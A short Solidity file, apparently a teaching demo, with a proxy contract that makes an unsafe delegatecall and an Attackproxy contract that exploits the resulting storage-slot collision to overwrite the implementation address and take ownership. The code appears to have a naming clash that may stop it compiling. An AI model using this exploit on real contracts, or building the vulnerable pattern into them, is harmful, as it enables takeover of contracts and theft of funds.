contract Impl {
    uint public num;

    function performOperation(uint _num) public {
        num = _num;
    }
}

contract proxy {
    address public impl;
    address public owner;
    uint public num;

    constructor(address _impl) {
        impl = _impl;
        owner = msg.sender;
    }

    function performOperation(uint _num) public {
        impl.delegatecall(abi.encodeWithSignature("performOperation(uint256)", _num));
    }
}

contract Attackproxy {

    address public impl;
    address public owner;
    uint public num;

    proxy public proxy;

    constructor(proxy _proxy) {
        proxy = proxy(_proxy);
    }

    function attack() public {
        proxy.performOperation(uint(uint160(address(this))));
        proxy.performOperation(9);
    }

    function performOperation(uint _num) public {
        owner = msg.sender;
    }
}
